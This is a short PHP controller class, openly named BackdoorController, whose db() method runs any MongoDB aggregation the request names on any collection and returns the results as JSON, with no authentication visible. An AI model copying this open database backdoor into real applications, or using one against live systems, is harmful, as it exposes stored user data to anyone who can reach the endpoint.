<?php

namespace app\controllers;

use app\core\App;
use app\core\controllers\Controller;
use app\core\lib\Test;
use app\core\request\Request;


class BackdoorController extends Controller
{
    public function __construct(Request $request)
    {
        $this->method = $request->getBody()['method'];
        $this->coll = $request->getBody()['coll'];
        $this->filter = $request->getBody()['filter'] ?? [];
    }

    public function index(Request $request)
    {
    }

    public function db()
    {
        $result = App::$app->mongoDb->connectDb()->{$this->coll}->aggregate($this->filter);
        echo json_encode($result->toArray(), true);
    }

    public function store()
    {
    }

    public function insert()
    {
    }

    public function destroy()
    {
    }

    public function test()
    {
    }
}
